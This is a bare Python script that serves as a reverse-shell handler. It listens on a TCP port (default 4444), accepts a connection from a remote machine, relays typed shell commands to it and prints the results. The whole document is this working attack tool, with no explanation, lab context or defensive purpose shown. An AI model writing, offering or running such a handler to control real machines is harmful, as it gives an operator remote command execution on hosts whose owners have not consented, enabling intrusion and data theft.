#!/usr/bin/env python3
import socket
import sys

HOST = "0.0.0.0"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(1)

print(f"[*] Listening on {HOST}:{PORT} ...")
conn, addr = server.accept()
print(f"[+] Shell from {addr[0]}:{addr[1]}")

try:
    while True:
        cmd = input("$ ")
        if not cmd.strip():
            continue
        conn.sendall((cmd + "\n").encode())
        output = conn.recv(65536).decode(errors="replace")
        print(output, end="")
except (KeyboardInterrupt, EOFError):
    print("\n[*] Closing.")
finally:
    conn.close()
    server.close()
